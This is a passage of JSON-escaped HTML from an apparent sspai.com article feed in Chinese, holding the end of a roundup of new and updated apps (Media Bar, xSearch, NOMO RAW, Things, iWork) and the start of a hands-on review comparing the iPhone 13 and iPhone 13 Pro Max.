target=\"_blank\">酷安</a> 免费下载 Unknown。</p>\n<span class=\"ss-application\" app-id=\"16176\"> </span><h3>Media Bar：通过状态栏实时查看播放进度</h3>\n<ul>\n<li>平台：Android</li>\n<li>关键词：状态栏、播放控制</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Peggy_\" user-id=\"bs2p015b34tch278nkdg\" href=\"https://sspai.com/u/5isr02uh\">@Peggy_</a>：通常来说，一首歌的时间是 4 分钟左右，我还记得几年以前我总会计算自己上学路上能听完几首歌，有时候听歌听到睡着，路途继续，音乐不停。现在工作了，我还是会经常盯着一首歌的进度条，从前奏响起到高潮再到歌曲终了，感受时间的流逝，Media Bar 这一应用则尝试将音乐的进度变得可视化，让我在手机的任一应用界面都能看见音乐。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbi95b34teh5fkvjtg.jpeg\"></figure><p>安装好 Media Bar 后，我们需要给予它辅助功能权限和通知权限，以便其读取音乐播放进度并方便其控制音乐播放行为。简单设置完成后，Media Bar 会在系统状态栏显示一个彩色进度条，进度条会随着播放进度逐渐走到屏幕尽头，我们可以根据自己的喜好来选择进度条的起点是中间还是两端，从而达到不同的视觉效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbi95b34teh5fkvju0.jpeg\"></figure><p>Media Bar 的个性化定制功能主要体现在进度条的样式上，可供修改的地方有进度条的颜色、宽度、点击行为等。譬如我们可以根据时间来将进度条划分为不同的颜色，当播放至相应的时间点时，进度条也会随之变色。此外我们还可以选择将进度条显示在屏幕顶端还是状态栏下方。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbi9db34teh0gc1kj0.jpeg\"></figure><p>Media Bar 将点击进度条的动作分为单击、双击和长按，我们可以按照自己的使用习惯将相应的行为设置为暂停/播放、快进/快退乃至是切换不同的应用等等。</p>\n<p>Media Bar 应用本体及基础功能免费，应用内有广告，去除广告、解锁更多进度条样式和点击动作则需要付费。你可以通过 <a href=\"https://play.google.com/store/apps/details?id=apps.ijp.mediabar\" target=\"_blank\">Play Store</a> 下载使用 Media Bar。</p>\n<span class=\"ss-application\" app-id=\"16178\"> </span><h3>xSearch：「全球」搜索一处搞定</h3>\n<ul>\n<li>平台：iOS / iPadOS</li>\n<li>关键词：搜索、扩展</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@红酒皇\" user-id=\"bs2p85tb34tcs0pmdeeg\" href=\"https://sspai.com/u/Fabrina\">@红酒皇</a>：天下苦搜索引擎久矣。有的时候为了在特定的场景搜索，需要在关键词后输入搜索引擎，对于频繁切换的搜索动作来说，操作起来还是免不了一番麻烦。现在，恰由于 Safari 可以添加 xSearch 插件了，用户们可以直接在搜索框中输入明确的搜索引擎，快速跳转至特定的搜索场景中。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbi9lb34teh5fkvjug.png\"></figure><p>xSearch 的使用十分简单，是爸爸妈妈都可以一下子学会的轻便工具。只需要记得在「我的引擎」中记录的快捷键名称，在搜索框中输入「快捷键+空格+关键词」，就可以在 Safari 中实现各大网站的快捷搜索。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbi9tb34teit0pn1p0.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbia5b34teh3cl8sfg.png\" alt=\"\"></figure><p>在引擎库中，用户还可以激活常用的搜索引擎，包含知乎、简书、豆瓣、V2EX 等多种预设网站，快速实现搜索操作的正中红心，避免在无效信息中筛选的时间浪费。除了预设外，用户当然可以手动添加常用搜索引擎。比如创建一个「少数派」专用搜索，就可以直接将搜索页面的关键词替换为「%s」后将链接添加至「我的引擎」中，设置好快捷键后就可以立即使用了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/10/04/dabed7045a0502fcdce7a8ae7b98a927.gif\"></figure><p>你可以在 <a href=\"https://apps.apple.com/cn/app/xsearch-for-safari/id1579902068\" target=\"_blank\">App Store</a> 购买 xSearch ，应用售价 12 元。</p>\n<span class=\"ss-application\" app-id=\"16177\"> </span><h2>值得关注的 App 更新</h2>\n<p>除了「新鲜」App，App Store 中的许多老面孔也在不断迭代、更新，增加更多有趣和实用的功能。少数派希望帮你筛选 App Store 中值得关注的 App 动态，让你快速了解 App 和开发者们的最新动态。</p>\n<h3>NOMO RAW：iOS 上的专业相机 App，现以更 Pro 的姿势呈现</h3>\n<ul>\n<li>平台：iOS</li>\n<li>关键词：摄影、RAW</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Vanilla\" user-id=\"bs2ov5lb34tch278f9ag\" href=\"https://sspai.com/u/whoops\">@Vanilla</a>：如果你和我一样是一名手机摄影爱好者，并且恰好你使用的手机是 iPhone 12 Pro 系列或者 iPhone 13 Pro 系列，那么你一定要尝试一下 NOMO RAW，因为它赋予了 iPhone 摄影更加强大的功能，不管是日常记录还是专业拍摄，都能获得绝佳的创作体验。</p>\n<p>在 iOS 15 正式发布后，NOMO RAW 更新到了 2.0 版本，新增了一个 ProRAW 编辑器，这也就是意味着我在拍照的时候可以像使用原生相机一样来使用 NOMO RAW，只需要专注于「构图」，其它所有事情都可以在拍摄结束后再一一调整。</p>\n<p>首先，我要确保自己在相机界面的左上角打开 RAW，也就是说我选择的格式需要是 RAW+HEIF 或者 RAW+JPEG，这样才可以在拍摄好的图片下面看到「编辑图片」和「版本管理」的按钮。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbiatb34teit0pn1pg.jpeg\"></figure><p>在「编辑图片」界面中，我可以针对图片进行画幅比例、色彩方案、曝光（RAW）、色温（RAW）、色调（RAW）、锐化（RAW）、阴影（RAW）、高光、对比度、饱和度、胶片颗粒、暗角等多达 11 项的调整，其中有 5 项是专门针对 RAW 格式的照片来进行。需要注意的是，在 NOMO RAW 中参数调节的交互逻辑和 iOS 自带相机中的完全相反，一开始可能需要适应一下。在编辑器中还有一个贴心的小功能，那就是「放大镜」辅助工具，飞猪老师说灵感来自胶片摄影中的「观片器」，可以让我在看到局部细节的同时看到整张图片的效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbib5b34teh3cl8sg0.jpeg\"></figure><p>这个「放大镜」辅助工具是为了服务于编辑器中的「RAW 锐化」调节，以及全新加入的一组胶片色彩方案。在 NOMO RAW 2.0 版本中，新增的 9 个色彩方案包括了：</p>\n<ul>\n<li>f1: Fujicolor Pro 160C</li>\n<li>f3: F-CP TYPE3510</li>\n<li>f4: Fujicolor Superia 400</li>\n<li>k1: Kodak Portra 160</li>\n<li>k2: KODAK VISION 2382</li>\n<li>k4: Kodak Portra 400</li>\n<li>a1: Agfa Portrait 160</li>\n<li>a4: AgfaPhoto Vista 400</li>\n<li>x4: Kodak Tri-X 400</li>\n</ul>\n<p>经过我这几天的使用，我个人最喜欢的是 f1: Fujicolor Pro 160C、f3: F-CP TYPE3510 和 k4: Kodak Portra 400。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbibdb34teit0pn1q0.jpeg\"></figure><p>「版本管理」是另外一个非常实用的功能，我在 NOMO RAW 中不管是针对画幅比例、色彩方案还是参数调整，都可以记录为一个单独的版本或者覆盖原有的版本。在实际使用中，我会针对同一张照片做不同风格的调整，然后在「版本管理」中保存为不同的副本，最后再筛选出自己喜欢的那张照片。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbiblb34teh0gc1kk0.jpeg\"></figure><p>NOMO RAW 可以在 <a href=\"https://apps.apple.com/cn/app/nomo-raw-%E4%B8%93%E4%B8%9A-proraw-%E7%9B%B8%E6%9C%BA/id1572429540?mt=8&amp;ign-mpt=uo%3D4\" target=\"_blank\">App Store</a> 免费下载，但是需要付费订阅使用，价格为 13 元/月或者 98 元/年。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/67661\" target=\"_blank\">功能强大也能轻松上手，它想成为你的 iPhone 默认相机：NOMO RAW</a></p>\n<span class=\"ss-application\" app-id=\"16098\"> </span><h3>Things：适配 iOS / iPadOS 15 新特性</h3>\n<ul>\n<li>平台：iOS / iPadOS / macOS / watchOS</li>\n<li>关键词：任务管理</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Snow\" user-id=\"bs2od75b34tch2730o80\" href=\"https://sspai.com/u/ul0vcezb\">@Snow</a>：上周，著名待办应用 <a href=\"https://sspai.com/app/Things%203\" target=\"_blank\">Things</a> 更新了 3.15 版，增加了大量对 iOS 15 和 iPadOS 15 新特性的适配功能。</p>\n<p>首先是在已经不怎么「小」的小组件上的改进，Things 在第一时间适配了 iPad 全新超大号组件，你可以在这个 2X4 的组件中查阅接下来几天中要做的事，又或是任意一个待办清单。这次任务就在桌面上看着你们呐，还有什么理由忘记呢？新版部件也不再强制与应用主题同步，你可以在「设置 - 外观」中任意更改为浅色或暗色，不再影响你的桌面美化大计。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbic5b34teh5fkvjv0.png\"></figure><p>不仅是外观得到优化，小组件在易用性和隐私上也有所提升。小组件上的「+」号得到了一定扩展，你可以通过长按编辑小组件更改「+」号的跳转逻辑，选择进入默认收件箱或当前列表创建新任务。当然，你也可以选择禁用「+」号，让小组件看起来更为简洁。而当你的设备锁屏时，小组件上所有的任务都会被自动「打码」，不会被他人轻易窥视了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbicdb34teit0pn1qg.jpeg\"></figure><p>第二项更新则重点调用了「Live Text」功能，在编辑待办备注时，长按编辑区就可以使用这一功能，通过摄像头识别文字快速录入信息。由于应用并不支持将识别内容自动转化为任务或是子任务，且只能在备注区域使用，这一功能主要还是用于信息补充。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbicdb34teh5fkvjvg.jpeg\"></figure><p>第三项优化则是针对 iOS 15 新的通知逻辑，新版在系统通知中增加了「时效性通知」一项，启用后无论你是选择立即推送还是定时摘要，又或是在专注模式下允许时效性通知，都不会错过重要的任务提醒。此外，Things 通知也支持 Siri 语音播报，在驾车或其他忙碌状况下不方便查看通知时，让 Siri 直接阅读待办事项的标题，方便你更高效地处理事务。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbiclb34teit0pn1r0.jpeg\"></figure><p>Things 这个小版本更新内容还不止这些，新版增加了 Apple Watch 息屏显示，对 iPadOS 15 快速备忘录进行适配，iPad 外接键盘操作以及快捷指令也得到了小幅优化，虽说都是些小修小改，但对于效率提升还是非常明显的。</p>\n<p>Things <a href=\"https://apps.apple.com/cn/app/things-3/id904237743\" target=\"_blank\">iOS 版本</a> 售价 68 元，<a href=\"https://apps.apple.com/cn/app/things-3-for-ipad/id904244226\" target=\"_blank\">iPadOS 版本</a> 售价 128 元，你可以在 App Store 上下载使用。</p>\n<span class=\"ss-application\" app-id=\"12476\"> </span><h3>iWork：办公三件套大更新，让线上协作更加便利</h3>\n<ul>\n<li>平台：iOS / iPadOS / macOS</li>\n<li>关键词：办公、协作、讲演</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@化学心情下2\" user-id=\"bs2od75b34tch2730oa0\" href=\"https://sspai.com/u/liuxiaofengone\">@化学心情下2</a>：虽然在办公套件领域，Microsoft Office 是其中的霸主，但如果你的设备都是 Apple 的产品，那么 iWork 可以充分利用你的设备，获得跨平台且无缝的应用功能体验，这也体现在近期更新的 iWork 套件中。</p>\n<p>首先，对于经常使用 Keynote 讲演来制作演示文稿的朋友，近期更新中加入了一项非常实用的功能：利用 iPhone、iPad 以及 Mac 的前置摄像头，直接在演示文稿中加入实时视频。你可以调整视频大小，使用面具、画框、投影和映像加以装饰，同时 Mac 用户还可以一次连接过个摄像头，实现临场感。甚至可以在演示时在文稿中显示 iPhone 和 iPad 的屏幕内容，所以这个功能非常适合在进行远程会议进行项目演示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbid5b34teh3cl8sgg.gif\"></figure><p>另一项新功能同样服务于演示文稿：多演讲者选项，这个功能可以让参与者使用 iPhone、iPad 或者 Mac 直接控制并共享演示文稿的播放，并且无论是参与者处于同一个地理位置还是通过远程进行协作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbiddb34teh3cl8sh0.jpeg\"></figure><p>另一项较大的更新是专门针对 iPhone 上使用 Pages 文稿，新版本屏幕视图会自动在专为 iPhone 屏幕优化的单栏连续流动视图中显示文本、图片等其他元素。文本字号会增大以便阅读，照片和图画会自动缩放以适应屏幕，表格也可横向滚动显示。屏幕视图适用于所有文字处理文档，且无需额外设置。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbidlb34teh5fkvk00.gif\"></figure><p>最后的一项更新则是为 Numbers 表格加入了一项新功能：数据透视表，通过数据透视表可以快速的汇总、分组、重新整理数据，以辨认出模式与趋势，并对它们加以分析，创建方式也很简单——用户可以轻松选取需要的数据，选择如何对其进行分组与汇总，并在边栏访问其他显示选项，并且该功能适用于全平台的 Numbers 表格。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbie5b34teh5fkvk0g.jpeg\"></figure><p>同时Numbers 表格还加入了雷达图这个新的图标类型，可以实现多个变量对比，用重叠区域显示它们的相同点，从而突显不同点和异常值。新的过滤选项可以帮助用户在数据中发现重复条目和唯一值，也可轻松显示或隐藏匹配特定值的行列。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbie5b34teh3cl8shg.jpeg\"></figure><p>最后，新版 iWork 在 iOS 15、iPadOS 15 以及macOS Monterey 上支持翻译功能，选取文本，快速看到翻译内容或听到内容被大声朗读，并立即用译文替换选中的文本。 你可以在 App Store 免费获取 iWork 的新版本。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbiedb34teh5fkvk10.jpeg\"></figure><span class=\"ss-application\" app-id=\"14925\"> </span><span class=\"ss-application\" app-id=\"8729\"> </span><span class=\"ss-application\" app-id=\"15495\"> </span><h2>App 速报</h2>\n<ul>\n<li>Craft (<a href=\"https://www.craft.do/whats-new\" target=\"_blank\">iOS / iPadOS / macOS</a>)：适配 iOS / iPadOS 15，支持实况文本功能；增加图片标注功能更，网页版本等也有多项优化。</li>\n<li>Adobe Lightroom (<a href=\"https://blog.adobe.com/en/publish/2021/09/28/from-the-acr-team-masking-reimagined.html\" target=\"_blank\">macOS</a>)：加入了基于 AI 的蒙版功能，使用方法和 Photoshop 中的蒙版工具类似，可以在照片中快速调整某个区域，同时排除其他对象。</li>\n<li>Dropbox Capture (<a href=\"https://www.dropbox.com/capture\" target=\"_blank\">Windows / macOS</a>)：Dropbox 推出的截屏工具，用户可以使用该工具进行屏幕截图、通过录制 GIF 或者简单的视频来传达工作内容。</li>\n<li>PowerToys (<a href=\"https://github.com/microsoft/PowerToys/releases/tag/v0.47.0\" target=\"_blank\">Windows 10</a>)：更新至 v0.47.0，在资源管理器中现在添加了 PDF 预览插件，重新添加了长按 Windows 徽标键激活快捷指南功能。</li>\n<li>Newsletter 订阅和管理服务 <a href=\"https://mailbrew.com/\" target=\"_blank\">Mailbrew</a> 宣布停止提供免费版计划，同时付费版方案将至 4.99 美元 / 月。</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69105"},{"title":"平衡与极致：iPhone 13 &amp; iPhone 13 Pro Max 体验","date":"2021-10-04 03:21:11","description":"\n<p>每年 iPhone 推出新款之后，如何选择一定是个热门话题。一边是尺寸、功能都「刚刚好」的数字系列，一边是代表着最强移动设备的 Pro 系列，当然价格也是最强。尤其是去年 iPhone 12 mini 的加入，让本就难做的这道选择题变得更难了。</p>\n<p>今年我有机会拿到了 iPhone 13 和 iPhone 13 Pro Max 二台设备，并且也在之前 <a href=\"https://sspai.com/post/68922\" target=\"_blank\">上手体验</a> 了 iPhone 13 全系列的 4 款机型，对于不同型号 iPhone 的使用体验，以及如何选择的问题，也来聊聊我的看法。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/69007\">荧幕、影像、性能处处 Pro，一台没有「短板」的好手机：iPhone 13 Pro 体验</a></p>\n<h2>手感也许「没那么重要」</h2>\n<p>iPhone 12 mini 的出现，如同手机行业的一场「文艺复兴」：极致的尺寸设计、极佳的握持体验，不少人曾日思夜想的「小屏旗舰」，似乎在这里有了答案。不过，经过一年时间的检验，这台尺寸 mini 的 iPhone，似乎没有许多人当初想得那么好：出色的尺寸设计，牺牲的必然是电池续航；极佳的握持体验之外，好像也无更多优势可言。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/03/c05c2f1d30f203b5de5c85759e0e5424.jpeg\"><figcaption>iPhone 13 mini</figcaption></figure><p>相反地，在与 iPhone 13 相伴的一周之内，我重新找到了久违的轻松体验：与 iPhone 13 Pro 尺寸相仿的同时，轻了 30 克的手感称为减负毫不为过。作为 Pro 系列 iPhone 的多年用户，上手 iPhone 13 之后，我注意到了一个之前没有发现的细节：铝金属边框相比不锈钢边框，除了不留指纹之外，更加「亲切」的触感对于握持体验而言也有提升；如果要用词语来形容这种「亲切感」，「光滑」与「亲肤」也许较为准确。反观 iPhone 13 Pro 系列，手术级不锈钢边框不论质感还是触感虽然已经足够优秀，但是相比之下摸起来也确实有点「生涩」了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/10/03/fae9564b727883bf4e7788bede8e91f4.jpeg\"><figcaption>iPhone 13</figcaption></figure><p>当然，iPhone 13 的握持体验，也让人挑不出什么毛病。竖着拿，屏幕的各个角落都能轻松触达，「刚刚好」的尺寸和重量拿在手上也不会觉得累；横着拿，你会发现手指处在一个「舒服」的操作距离之内，既不会影响彼此，也不会遮挡屏幕内容，对于游戏场景尤为重要。</p>\n<p>对了，这台 iPhone 还有着可以说是「恰到好处」的大尺寸屏幕，看视频、玩游戏、浏览网页…… 配合超视网膜 XDR 显示屏，iPhone 13 带给你的是移动平台上顶级的视听体验。iPhone 13 mini 虽然也有着这样一块出色的屏幕，显示细腻度 (PPI) 甚至是 iPhone 之最；不过，对于看视频、玩游戏这类娱乐场景来说，相比于尺寸方面的「极致」，握持与操控性的「平衡」才是更重要的事。</p>\n<p>iPhone 13 Pro Max 则是 iPhone 系列「极致」的另一面：最强的配置、最大的屏幕、最长的续航，这是一台想给你全方位「Pro」体验的 iPhone。哑光质感搭配不锈钢边框，iPhone 一眼可见的「高级感」依然在 iPhone 13 Pro 系列得到了延续；手感，也不例外。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/04/b394d8563e9664d3e8214909e226a9ee.jpeg\"><figcaption>iPhone 13 Pro Max</figcaption></figure><p>虽然配置与 iPhone 13 Pro 已无差别，iPhone 13 Pro Max 具备的优势依然是显而易见的：更大的屏幕，不论是看视频还是玩游戏 (不考虑操控性的话) 的体验都是绝对的领先，续航也有了惊人的更优秀的日用水准。</p>\n<p>可是，iPhone 13 Pro Max 的「大」和「重」，对我而言依然难以适应。这是一台尺寸大到单手拿着操作都会费力的手机，比如即便有了「便捷访问」，要想单手下拉通知中心还是略显吃力；这台手机的重量也无法令人忽视，不管是拿在手上还是放在衣服口袋里，你都不会忘记 iPhone 带着身体「往下坠」的那种感觉。</p>\n<p>好在，与去年不同，iPhone 13 Pro Max 与 iPhone 13 Pro 在配置方面已无二致。因此，与其追求配置和视听体验方面的「极致」，iPhone 13 Pro 的「平衡」才是大多数人日常需要的那台手机的样子。</p>\n<p>总结一下：对于 iPhone 13 系列来说，手感很重要，但也没有那么重要，如果你经常用手机看视频、玩游戏，我更建议你选 iPhone 13。对于 iPhone 13 Pro 系列而言，手感很重要，随身体验也很重要，如果你更在意握持感受，iPhone 13 Pro 已经够用了；如果你的眼睛足够「讲究」，选 iPhone 13 Pro Max 不会出错。</p>\n<h2>高刷屏「惊艳」亮相，但也没有「回不去」</h2>\n<p>比起稍有提高的最大亮度，ProMotion 自适应刷新率无疑才是 iPhone 13 Pro 系列屏幕升级的重点。</p>\n<p>iPhone 13 Pro 系列是首次支持 120Hz ProMotion 自适应刷新率技术的 iPhone 机型，刷新频率可在每秒 10 次到 120 次之间自由调整。比如，当浏览屏幕内容静止不动时，屏幕会自动切换至低刷新率运行，当滑动屏幕查看内容或者玩游戏时，屏幕又会动态调整至高刷新率运行，最高可达 120Hz。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/03/061faae6abf798ae70f84dcba9ef4e12.gif\"></figure><p>第一次上手 iPhone 13 Pro 系列，这块屏幕就给我留下了深刻印象。不论是画面上下左右滑动时的流畅感受，还是应用交互的跟手程度，与之前相比都是完全不同的体验。即使 iPhone 13 Pro Max 已经陪伴了我一周时间，每次点亮屏幕，新鲜、流畅的滑动体验依然会「扑面而来」。</p>\n<p>但是，高刷新率对于体验的影响，不同的人感知也不尽相同。在我身边拿到 iPhone 13 Pro 系列的朋友中，对于这块高刷屏，有人觉得与之前相比没什么变化，也有人只在多任务界面等特定应用中才有较强感知。因此，如果高刷新率是你决定入手新款 iPhone 非常看重的一点，务必亲自前往线下 Apple Store 商店，上手体验之后再行决定。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/10/03/137aaf3e38fab7be3b2b8699af61318a.gif\"></figure><p>另外，也别着急。ProMotion 高刷屏虽然终于在 iPhone 上闪亮登场，也还不至于到了「用完就回不去」的地步。在同时使用 iPhone 13 Pro Max 和 iPhone 13 的这段时间里，虽然每次点亮 iPhone 13 的屏幕我都有一种稍微变「卡」了一点的感觉，但是熟悉的动画与交互告诉我，这依然是那台流畅的 iPhone，用它看视频、玩游戏、浏览网页，也丝毫不会有不流畅、不跟手的糟糕体验。</p>\n<p>目前来看，ProMotion 技术在 iPhone 上的初次表现可以用「惊艳」来形容，高刷新率也让本就优秀的 iOS 交互体验更上了一层楼，让人越用越喜欢。不过，在没有 ProMotion 技术的 iPhone 13 系列中，高刷新率功能的缺失也不会让你错过什么，它更像是锦上添花，没有它你也依然能在这台 iPhone 上获得最完整的 iOS 体验，享受 iOS 与 iPhone 软硬件配合带来的良好生态体验。</p>\n<h2>强劲性能的背后，续航是重要支持</h2>\n<p>几乎每年 iPhone 发布会上，Tim Cook 都会强调，即将面世的 iPhone 将是史上性能最强的 iPhone，iPhone 13 系列也不例外。</p>\n<p>今年，驱动 iPhone 13 和 iPhone 13 Pro 系列成为最强 iPhone 的，是 A15 仿生芯片。可以说，在新款 iPhone 的每项新功能中，几乎都可以见到 A15 芯片的身影：「电影效果」模式、摄影风格、智能 HDR 4、实况文本、ProMotion 技术…… 这些功能背后，是 A15 芯片的强大计算能力给予了支持。尤其是 iPhone 13 Pro 系列，得益于 5 核 GPU 的强大图形性能，才让 iPhone 首次支持了可变刷新率功能，以及晚些时候将会推出的 ProRes 视频。</p>\n<p>也别忘了，作为最强 iPhone 的最强算力，不仅需要「能跑」，还得「会跑」。在让 iPhone 越变越强之余，如何平衡性能与功耗更是重中之重；只有合理分配和发挥 A15 芯片的性能，才能让 iPhone 电量持久、更加耐用。经过这段时间的体验，iPhone 13 和 iPhone 13 Pro Max 都给出了一份不错的续航答卷。</p>\n<p>iPhone 13 方面，经过整个白天的中高强度使用，期间包括 1 个小时的游戏时间、1 个小时的视频时间，还有陆陆续续浏览微博、小红书、微信等 App 的时间，这台手机从早上 9 点开始，一直用到下午 5 点电量才下降至 20% 以下。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/10/03/5ab94502f6998bce5caca4654efee556.jpg\"><figcaption>iPhone 13 续航</figcaption></figure><p>iPhone 13 Pro Max 的续航水平则更是惊人，经过类似的高强度使用场景，期间还包括了半小时的语音会议时间，从早上 9 点用到下午 4 点左右，电量甚至维持在了 60% 左右。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/10/03/58f58b4ce32447ded605e983968ebe04.jpg\"><figcaption>iPhone 13 Pro Max 续航</figcaption></figure><p>可以看到，不论是 iPhone 13 还是 iPhone 13 Pro Max，它们的续航能力可谓「强悍」，已经足够胜任你生活中那台可以用一整天的手机的工作。 有了 iPhone 13 Pro Max，你甚至还能带着这台手机在外面用一整天，用它拍照、乘公交、听音乐、看视频，不用担心频繁面临「电量焦虑」。</p>\n<h2>依然大行其道的「计算摄影」</h2>\n<p>相机方面，iPhone 13 全系列与 iPhone 12 全系列的硬件几乎没有太大变化，iPhone 13 Pro 系列长焦焦段变长、光圈变小，并且支持了夜间模式；iPhone 13 Pro 有了传感器位移式防抖模块。硬件之外，依靠 A15 芯片的算力，iPhone 13 系列和 iPhone 13 Pro 系列在软件方面都获得了更多能力。</p>\n<p>首先是 2 个系列都有的「电影效果」模式。凭借计算能力，iPhone 会在拍摄视频时自动判断画面中的焦点人物、动物或者物体，并在需要变换焦点的时候自动变化，普通用户无需专业电影知识就能轻松拍出具有精美景深效果的「电影感」画面。</p>\n<p>经过多次测试之后可以发现，「电影效果」的整体逻辑其实不难理解，系统会按照「人物 -&gt; 动物 -&gt; 静物」的逻辑顺序，优先决定对焦主体；当画面中同时出现多个人物或动物时，根据人物前后位置关系、画面比例等等，再次判断焦点主体。</p>\n<p>如果系统判断与你的预想存在出入也没有关系，除了拍摄时可以手动调整焦点，拍完之后你也可以手动再次调整每一帧画面的焦点，在编辑界面中，时间轴上白色的圆点是系统预判的画面焦点、黄色的圆点是用户调整之后的焦点，不仅好理解，调整起来也很方便。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/03/01595e67c21dbc610c00a005e838e006.jpg\"></figure><p>如果你用「电影效果」模式对着一个物体由远及近地拍摄就会发现，根据焦点主体距离远近的不同，背景的虚化效果会随之产生自然的变化，这个细节再次证明了这项功能所需的计算量之大，也能理解为什么只有最新的 iPhone 13 系列支持「电影效果」模式了。遗憾的是，正因如此，目前「电影效果」仅支持拍摄 1080p 30fps 的视频。</p>\n<p>其次是「微距摄影」，这项功能只在 iPhone 13 Pro 系列上支持，虽然依靠的是都有的超广角镜头，大概是因为 iPhone 13 Pro 系列上的这枚镜头光圈更大、进光量提升了有足足 92% 之多，结合 5 核 GPU 带来的更强图形处理能力，才能专享这项功能。</p>\n<p>比起「电影效果」模式，「微距摄影」不需构思拍摄场景，拍摄条件也更加灵活，基本上对着一个物体就能拍拍试试，实际上是普通用户更「用得上」的功能。没能看到这项功能来到 iPhone 13 系列上面，确实有点遗憾。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/03/7ba6661340bb5f95433b2672e3aea047.jpg\"><figcaption>微距能拍到平时注意不到的有趣细节</figcaption></figure><p>样张方面，其实没有太多想说，iPhone 13 系列的影像体验，依然是你熟悉的 iPhone 影像体验。如果要对今年 iPhone 13 系列的影像升级做个总结，用「智能」这个词进行概括绝对没错。</p>\n<p>智能 HDR 4 能够结合神经网络引擎的机器学习能力，更加智能地判断画面中的场景、人物、彼此的前后景关系；即使是大逆光背景下，也能准确判断不同人物的肤色，有针对性地优化。</p>\n<p>「摄影风格」也是一样，调节色温和色调，就能形成专属风格。这可不是像把相片放进修图工具里调节色温和色调一样简单，「摄影风格」同样会智能地判断人物肤色、场景环境，更有针对性地进行调整。</p>\n<p>通过下面的样张可以看到，「摄影风格」拍出来的样张对于地板、泥土以及草丛的颜色还原更加真实，而通过手动调节的方式以同样的参数编辑得到的照片，地板已经发绿、泥土也已经发白了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/03/5648116fa3dea78205e9c8af0a00c94c.png\"><figcaption>「摄影风格」样张 | 手动调整一致参数修出的照片</figcaption></figure><p>在光线充足的白天，iPhone 对于颜色的还原非常到位，白平衡效果也相当准确。比如远近天空色彩的过渡、云朵的层次感都能准确体现；可以看到地面建筑、树木、泥土、石材等不同材质纹理与颜色的呈现也相当一致，对于光影变化的捕捉也足够「生动」。在这之中，更加智能的「深度融合」(Deep Fusion) 技术与智能 HDR 4 功不可没。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/03/9c044e4a6b9adb84221f1858fcfa0663.jpeg\"><figcaption>由 iPhone 13 广角镜头拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/04/440da0f6cfa2d73c3ba22c2ec2302748.jpeg\"><figcaption>由 iPhone 13 广角镜头拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/03/82b60e5800dc0df80ec172e1bbc7a087.jpeg\"><figcaption>由 iPhone 13 广角镜头拍摄</figcaption></figure><figure 